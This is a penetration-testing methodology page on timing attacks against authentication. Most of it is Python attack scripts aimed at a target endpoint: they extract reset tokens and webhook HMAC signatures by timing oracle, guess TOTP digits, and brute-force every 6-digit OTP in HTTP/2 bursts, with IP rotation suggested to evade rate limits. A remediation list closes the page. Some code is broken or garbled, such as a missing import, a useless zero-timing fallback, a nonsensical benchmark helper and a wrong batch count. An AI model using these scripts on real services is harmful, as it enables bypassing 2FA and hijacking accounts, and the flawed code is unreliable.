---
title: "Timing Attacks on Authentication"
date: 2026-02-24
draft: false
---

# Timing Attacks on Authentication

> **Severity**: Medium–High | **CWE**: CWE-208, CWE-385
> **OWASP**: A02:2021 – Cryptographic Failures | A07:2021 – Identification and Authentication Failures

---

## What Are Timing Attacks?

Timing attacks exploit measurable differences in processing time to infer secret information — whether a guess is correct, whether a user exists, or whether a token matches. The root cause is **non-constant-time comparison**: `==` short-circuits on the first mismatch, so comparing `"AAAA" == "AAAB"` takes longer than `"AAAA" == "ZZZZ"` because the mismatch occurs later in the first case.

```
String comparison (naive ==):
  "token1234" vs "token1235" → compares 8 chars, fails at char 9 → takes t₈ time
  "token1234" vs "XXXXXXXXX" → compares 1 char, fails at char 1 → takes t₁ time
  t₈ > t₁ → timing oracle reveals prefix "token123" is correct up to char 8
```

In web applications, network jitter usually dominates — but with sufficient samples and statistical analysis, differences of 100μs–1ms are detectable over internet links. Local networks or same-datacenter attacks can resolve differences of 10μs.

Attack targets: HMAC validation, API key comparison, password reset token validation, OTP/2FA code comparison, secret key comparison in JWT `HS256` verification.

---

## Discovery Checklist

**Phase 1 — Identify Timing-Sensitive Comparisons**
- [ ] Password reset token validation endpoint — vary token character by character
- [ ] HMAC/signature validation on webhooks — vary one byte at a time
- [ ] API key authentication — test keys with increasing correct prefixes
- [ ] OTP/TOTP code comparison — does correct prefix take longer?
- [ ] License key / serial number validation
- [ ] Custom authentication tokens (not JWT/bcrypt — those are designed for timing safety)

**Phase 2 — Measure Baseline and Signal**
- [ ] Send ≥50 requests with fully incorrect token → measure distribution
- [ ] Send ≥50 requests with correct prefix (1 char) → measure distribution
- [ ] Test if distributions are statistically distinguishable (Mann-Whitney U test)
- [ ] Test over multiple measurement sessions to confirm reproducibility
- [ ] Check if server adds any artificial delay (sleep/jitter) — that may mask timing

**Phase 3 — Exploit via Oracle**
- [ ] Build character-by-character oracle if timing is detectable
- [ ] Exploit username enumeration via timing (see Chapter 37)
- [ ] Exploit HMAC bypass via timing with HTTP/2 single-packet attack (reduces network jitter)

---

## Payload Library

### Payload 1 — Timing Oracle Detection

```python
#!/usr/bin/env python3
"""
Timing attack feasibility test
Measures time for matching vs non-matching token prefixes
"""
import requests, time, statistics, json, sys

TARGET = "https://target.com/api/reset/verify"

def measure_token(token, n=50):
    """Send n requests with given token and return timing statistics"""
    times = []
    for _ in range(n):
        t0 = time.monotonic()
        try:
            requests.post(TARGET,
                         headers={"Content-Type": "application/json"},
                         json={"token": token, "password": "NewPass123!"},
                         timeout=10)
        except: pass
        times.append((time.monotonic() - t0) * 1000)
    times.sort()
    # Trim top/bottom 10% to remove outliers:
    trim = max(1, len(times) // 10)
    trimmed = times[trim:-trim]
    return {
        "token": token[:10] + "...",
        "median": statistics.median(trimmed),
        "mean": statistics.mean(trimmed),
        "stdev": statistics.stdev(trimmed) if len(trimmed) > 1 else 0,
        "raw": trimmed,
    }

# Known invalid token (baseline — wrong from first byte):
invalid = measure_token("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX")
print(f"[Baseline] Invalid: {invalid['median']:.2f}ms ±{invalid['stdev']:.2f}ms")

# Token with correct prefix (assuming you leaked partial token via other vuln):
# Or: if you have a valid token, test what happens when last char changes:
# partially_correct = "abc123" + "X" * 26  # correct first 6 chars
# partially_correct_2 = "abc124" + "X" * 26  # wrong from char 6

# For demonstration — compare all-same vs last-different:
token_a = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"  # all wrong
token_b = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB"  # wrong except last differs
token_c = "BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"  # wrong from first char

result_a = measure_token(token_a)
result_b = measure_token(token_b)
result_c = measure_token(token_c)

print(f"[A] All same char:          {result_a['median']:.2f}ms ±{result_a['stdev']:.2f}ms")
print(f"[B] Diff at last position:  {result_b['median']:.2f}ms ±{result_b['stdev']:.2f}ms")
print(f"[C] Diff at first position: {result_c['median']:.2f}ms ±{result_c['stdev']:.2f}ms")

# Statistical significance test:
from scipy import stats
# Mann-Whitney U test — non-parametric, doesn't assume normal distribution:
try:
    from scipy.stats import mannwhitneyu
    u, p = mannwhitneyu(result_a['raw'], result_c['raw'], alternative='two-sided')
    print(f"\n[Statistics] Mann-Whitney U={u:.0f}, p={p:.6f}")
    if p < 0.05:
        print("[!!!] Statistically significant timing difference detected! Timing oracle likely.")
    else:
        print("[*] No significant difference — may still exist with more samples or HTTP/2")
except ImportError:
    print("[*] Install scipy for statistical testing: pip3 install scipy")
```

### Payload 2 — Character-by-Character Oracle Attack

```python
#!/usr/bin/env python3
"""
Character-by-character timing oracle token extraction
Prerequisite: confirmed timing difference of >0.5ms per character position
"""
import requests, time, statistics, string, json

TARGET = "https://target.com/api/token/verify"
TOKEN_LENGTH = 32  # known or guessed
CHARSET = string.ascii_lowercase + string.digits  # adjust to token charset
SAMPLES = 30  # requests per candidate
PADDING = 'x'  # padding char

def probe(token, samples=SAMPLES):
    """Probe a specific token value, return median time"""
    times = []
    for _ in range(samples):
        t0 = time.monotonic()
        try:
            r = requests.post(TARGET, json={"token": token}, timeout=10)
        except: pass
        times.append((time.monotonic() - t0) * 1000)
    times.sort()
    trim = max(1, len(times) // 10)
    return statistics.median(times[trim:-trim])

def extract_token():
    known = ""
    print(f"[*] Extracting token of length {TOKEN_LENGTH}")
    print(f"[*] Charset: {CHARSET}")
    print(f"[*] Samples per probe: {SAMPLES}\n")

    for position in range(TOKEN_LENGTH):
        results = {}
        for char in CHARSET:
            # Candidate: known prefix + test char + padding
            candidate = known + char + PADDING * (TOKEN_LENGTH - len(known) - 1)
            t = probe(candidate)
            results[char] = t

        # Best char = the one that takes longest (comparison reached this position):
        best_char = max(results, key=results.get)
        best_time = results[best_char]

        # Confidence: difference between best and second-best:
        sorted_times = sorted(results.values(), reverse=True)
        confidence = sorted_times[0] - sorted_times[1] if len(sorted_times) > 1 else 0

        known += best_char
        print(f"Position {position+1:02d}: '{best_char}' "
              f"({best_time:.2f}ms, +{confidence:.2f}ms over next) → {known}")

    print(f"\n[+] Extracted token: {known}")
    return known

# Note: requires measurable timing difference.
# For internet targets, use HTTP/2 to reduce jitter (see Payload 4).
result = extract_token()
```

### Payload 3 — HMAC Timing Attack on Webhooks

```python
#!/usr/bin/env python3
"""
Timing attack on webhook HMAC signature validation
Many webhook handlers compare signatures with ==
"""
import requests, time, statistics, hmac, hashlib, string

# Target: validates HMAC-SHA256 of body, signature in header
TARGET = "https://target.com/webhooks/receive"
BODY = b'{"event":"test","data":"value"}'  # fixed body for reproducible HMAC

def probe_webhook(signature, body=BODY, samples=40):
    """Send webhook request with given signature, measure response time"""
    times = []
    for _ in range(samples):
        t0 = time.monotonic()
        requests.post(TARGET,
                     headers={"X-Hub-Signature-256": f"sha256={signature}"},
                     data=body, timeout=10)
        times.append((time.monotonic() - t0) * 1000)
    times.sort()
    trim = max(1, len(times) // 10)
    return statistics.median(times[trim:-trim])

# HMAC-SHA256 signature is 64 hex chars
CHARSET = "0123456789abcdef"
SIG_LENGTH = 64

def extract_hmac():
    known = ""
    print("[*] Extracting HMAC signature via timing oracle")

    for pos in range(SIG_LENGTH):
        results = {}
        for char in CHARSET:
            candidate = known + char + "0" * (SIG_LENGTH - len(known) - 1)
            t = probe_webhook(candidate)
            results[char] = t
            sys.stdout.write(f"\r[pos {pos+1}] Testing '{char}': {t:.1f}ms")
            sys.stdout.flush()

        best = max(results, key=results.get)
        known += best
        print(f"\n[pos {pos+1}] Best: '{best}' → {known}")

    return known

# In practice: this only works cleanly on local/same-DC networks.
# Over internet: supplement with Turbo Intruder / HTTP/2 single-packet attack.
```

### Payload 4 — HTTP/2 Single-Packet Timing (Reduce Jitter)

```python
#!/usr/bin/env python3
"""
HTTP/2 single-packet attack for timing measurements
Sends multiple requests in a single TCP packet → server processes simultaneously
→ eliminates most network jitter → better timing measurements
"""
import httpx, asyncio, time, statistics

TARGET = "https://target.com/api/token/verify"

async def concurrent_probe(tokens: list[str]) -> dict[str, float]:
    """
    Send all token probes simultaneously via HTTP/2 multiplexing
    → server processes them concurrently → relative timing more accurate
    """
    results = {}
    async with httpx.AsyncClient(http2=True) as client:
        # Create tasks for all tokens simultaneously:
        tasks = []
        for token in tokens:
            tasks.append(
                client.post(TARGET,
                           json={"token": token},
                           headers={"Content-Type": "application/json"})
            )

        # Send all requests in same TCP window:
        times_before = time.monotonic()
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        total = time.monotonic() - times_before

        # Parse individual response timing from headers (if server provides X-Response-Time):
        for token, resp in zip(tokens, responses):
            if isinstance(resp, Exception):
                results[token] = float('inf')
            elif hasattr(resp, 'headers') and 'x-response-time' in resp.headers:
                results[token] = float(resp.headers['x-response-time'])
            else:
                # Fall back to rough estimate based on position in batch
                results[token] = 0  # can't distinguish without server-side timing

    return results

async def h2_oracle_attack():
    """Character-by-character extraction using HTTP/2 batch probing"""
    import string
    CHARSET = string.ascii_lowercase + string.digits
    TOKEN_LEN = 32
    known = ""

    for position in range(TOKEN_LEN):
        # Build batch of all candidate tokens:
        candidates = {
            char: known + char + "x" * (TOKEN_LEN - len(known) - 1)
            for char in CHARSET
        }

        # Run multiple rounds:
        round_results = {char: [] for char in CHARSET}
        for _ in range(10):  # 10 rounds
            token_list = list(candidates.values())
            timings = await concurrent_probe(token_list)
            for char, token in candidates.items():
                if token in timings:
                    round_results[char].append(timings[token])

        # Median timing per character:
        medians = {char: statistics.median(times) if times else float('inf')
                   for char, times in round_results.items()}

        best_char = max(medians, key=medians.get)
        known += best_char
        print(f"[pos {position+1}] → '{best_char}' | {known}")

asyncio.run(h2_oracle_attack())
```

### Payload 5 — OTP / TOTP Timing Attack

```python
#!/usr/bin/env python3
"""
TOTP 2FA timing attack — detect correct code via timing
Note: only works if server compares OTP as string, not using constant-time comparison
TOTP codes are 6 digits, giving 1,000,000 possibilities — timing oracle speeds this up
"""
import requests, time, statistics

TARGET = "https://target.com/api/auth/verify-otp"
SESSION_TOKEN = "USER_SESSION_AFTER_PASSWORD"  # post-password, pre-2FA token

def probe_otp(code: str, samples=20):
    """Probe OTP code, return median response time"""
    times = []
    for _ in range(samples):
        t0 = time.monotonic()
        requests.post(TARGET,
                     headers={"Authorization": f"Bearer {SESSION_TOKEN}",
                              "Content-Type": "application/json"},
                     json={"otp": code},
                     timeout=10)
        times.append((time.monotonic() - t0) * 1000)
    times.sort()
    return statistics.median(times[2:-2])  # trim extreme values

# TOTP is time-based with ±30 second windows — only 2-3 valid codes at any time
# Timing attack on digit-by-digit comparison:
# Correct first digit → comparison reaches second digit → slightly longer

# Batch test all first-digit options:
print("[*] Testing first digit (0-9)...")
results = {}
for d in range(10):
    code = str(d) + "00000"  # test each leading digit
    t = probe_otp(code, samples=30)
    results[d] = t
    print(f"  Digit {d}: {t:.2f}ms")

best_first = max(results, key=results.get)
print(f"\n[*] Likely first digit: {best_first}")

# Continue for each subsequent digit... but in practice:
# TOTP windows rotate every 30s — need to complete extraction within window
# Full 6-digit oracle: 6 * 10 * 30 samples = 1800 requests max in 30s window
# → need fast network and low latency
# → more practical: combine with rate limit bypass (IP rotation)
```

### Payload 6 — Race Condition + Timing Combination

```python
#!/usr/bin/env python3
"""
Combine timing oracle with race condition for OTP bypass
Send all 6-digit combinations simultaneously in HTTP/2 burst
"""
import httpx, asyncio, itertools

TARGET = "https://target.com/api/verify-otp"
SESSION = "SESSION_TOKEN_HERE"

async def burst_otp_guess(prefix: str, depth: int = 6):
    """
    Send all possible OTP values with given prefix simultaneously
    Faster than sequential — takes one server response window
    """
    async with httpx.AsyncClient(http2=True) as client:
        # Generate all completions of prefix:
        suffix_len = depth - len(prefix)
        suffixes = [''.join(s) for s in itertools.product('0123456789', repeat=suffix_len)]
        codes = [prefix + s for s in suffixes]

        # Split into batches (HTTP/2 has stream limits per connection):
        batch_size = 100
        for i in range(0, len(codes), batch_size):
            batch = codes[i:i+batch_size]
            tasks = [
                client.post(TARGET,
                           headers={"Authorization": f"Bearer {SESSION}",
                                    "Content-Type": "application/json"},
                           json={"otp": code})
                for code in batch
            ]
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            for code, resp in zip(batch, responses):
                if not isinstance(resp, Exception) and resp.status_code == 200:
                    print(f"[!!!] Valid OTP found: {code}")
                    return code
        return None

# Brute force all 6-digit OTPs in ~10 batches of 100:
# (Only if no rate limiting — combine with IP rotation if rate limited)
asyncio.run(burst_otp_guess("", depth=6))
```

---

## Tools

```bash
# Turbo Intruder (Burp extension) — high-precision timing measurement:
# Use the "timing" attack type in Turbo Intruder
# Script example (Python in Turbo Intruder):
# def queueRequests(target, wordlists):
#     engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1,
#                           requestsPerConnection=1000, pipeline=False)
#     for word in wordlists[0]:
#         engine.queue(target.req, word.rstrip())
# def handleResponse(req, interesting):
#     table.add(req)  # add response time to table for analysis

# httpx with HTTP/2 support:
pip3 install httpx[http2]

# scipy for statistical analysis:
pip3 install scipy

# wrk / hey — high-throughput timing measurement:
hey -n 1000 -c 10 -m POST \
  -H "Content-Type: application/json" \
  -d '{"token":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}' \
  https://target.com/api/verify

# Python requests timing helper:
python3 << 'EOF'
import requests, time, statistics

def benchmark(url, payload, n=100):
    times = [
        (lambda t0: (time.monotonic() - t0) * 1000)(
            (lambda: time.monotonic())()
        ) if False else  # walrus trick for inline timing
        (lambda: [
            time.monotonic(),
            requests.post(url, json=payload, timeout=10),
        ])()
        for _ in range(n)
    ]
# Simpler version:
def benchmark2(url, payload, n=100):
    times = []
    for _ in range(n):
        t0 = time.monotonic()
        requests.post(url, json=payload, timeout=10)
        times.append((time.monotonic() - t0) * 1000)
    times.sort()
    return statistics.median(times[n//10:-n//10])

t1 = benchmark2("https://target.com/verify", {"token": "AAAA"})
t2 = benchmark2("https://target.com/verify", {"token": "ZZZZ"})
print(f"AAAA: {t1:.2f}ms, ZZZZ: {t2:.2f}ms, diff: {t1-t2:.2f}ms")
EOF

# For local/same-network timing (more precise):
# Use clock_gettime(CLOCK_MONOTONIC_RAW) — not affected by NTP adjustments
# Python: time.monotonic() uses CLOCK_MONOTONIC — sufficient for millisecond differences
# For microsecond precision: use C extension or perf_counter_ns()
python3 -c "import time; print(time.perf_counter_ns())"
```

---

## Remediation Reference

- **Constant-time comparison**: use `hmac.compare_digest()` in Python, `hash_equals()` in PHP, `crypto.timingSafeEqual()` in Node.js — never use `==` or `===` for secrets
- **Consistent hashing for unknown users**: always compute a bcrypt/Argon2 hash even when the user is not found — use a dummy hash to normalize response time
- **Artificial jitter**: add a small random sleep (0–50ms) before returning authentication responses — makes timing measurements noisier, though not a fix alone
- **Limit measurement opportunities**: strict rate limiting on authentication endpoints (login, token verify, OTP) — 5–10 attempts per minute per IP
- **Short-lived tokens**: OTP codes with 30–60 second windows limit the oracle window — implement strict time-based token invalidation
- **HMAC validation**: use `hmac.compare_digest()` and validate the full HMAC in one constant-time call — don't early-exit on length mismatch before the comparison
- **HTTP/2 considerations**: single-packet attacks reduce network jitter on HTTP/2 — timing-safe code is essential regardless of transport

*Part of the Web Application Penetration Testing Methodology series.*
